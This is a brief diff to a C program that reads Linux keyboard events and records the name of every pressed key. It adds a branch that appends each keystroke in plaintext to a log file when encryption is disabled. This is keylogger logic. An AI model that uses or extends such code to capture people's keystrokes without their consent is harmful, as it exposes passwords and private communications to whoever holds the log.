@@ -650,7 +650,24 @@ int main(int argc, char **argv)
                     if (ev.type == EV_KEY && ev.value == 1)
                     {
                         const char *key_name = get_key_name(ev.code);
-                        log_key(&cache, key_name, encryption_enabled);
+
+                        if (encryption_enabled)
+                        {
+                            // Cache the key if encryption is enabled
+                            log_key(&cache, key_name, encryption_enabled);
+                        }
+                        else
+                        {
+                            // Write plaintext keypress to the file directly
+                            FILE *file = fopen(logFilePath, "a");
+                            if (!file)
+                            {
+                                perror("Error opening log file for plaintext logging");
+                                exit(EXIT_FAILURE);
+                            }
+                            fprintf(file, "%s\n", key_name);
+                            fclose(file);
+                        }
                     }
                 }
             }
